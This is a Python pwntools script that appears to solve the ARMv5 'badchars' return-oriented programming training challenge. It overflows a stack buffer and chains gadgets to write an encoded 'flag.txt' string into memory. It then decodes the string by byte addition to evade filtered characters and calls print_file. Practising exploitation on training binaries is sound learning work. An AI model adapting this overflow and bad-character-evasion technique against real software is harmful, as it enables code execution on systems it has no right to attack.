from pwn import *

r5_r6_pop_r0_pc =  0x10600 # [r5] = [r5] + r6 : ldr r1,[r5]; add r1,r1,r6; str r1,[r5]; pop {r0,pc};
write_addr = 0x21024
pop_r5_r6_pc = 0x10614
xor_r1_r5_pop_r0_pc = 0x10618

str_r3_to_r4_pop_r5_r6_pc = 0x00010610



pop_r3_pc = 0x00010484
pop_r4_pc = 0x000105b0
pop_r0_pc = 0x000105fc
print_file = 0x000104c0

p = process('./badchars_armv5-hf')

p.recvuntil('> ')

buf = b'A' * 0x2c
buf += p32(pop_r3_pc)

#####################
# [write_addr] = 'flag'
buf += b'ek`f' #r3
buf += p32(pop_r4_pc) #pc

buf += p32(write_addr) #r4
buf += p32(str_r3_to_r4_pop_r5_r6_pc) #pc

buf += p32(write_addr) # r5
buf += p32(0x1010101) # r6
buf += p32(r5_r6_pop_r0_pc) # pc

buf += b'AAAA' # r0
buf += p32(pop_r3_pc) # pc

#######################
# [write_addr + 4] = '.txt'
buf += b'-sws' #r3
buf += p32(pop_r4_pc) #pc

buf += p32(write_addr + 4) #r4
buf += p32(str_r3_to_r4_pop_r5_r6_pc) #pc

buf += p32(write_addr+4) # r5
buf += p32(0x1010101) # r6
buf += p32(r5_r6_pop_r0_pc) # pc

######################
# call print_file
buf += p32(write_addr) # r0
buf += p32(print_file) # pc


p.send(buf)
p.interactive()
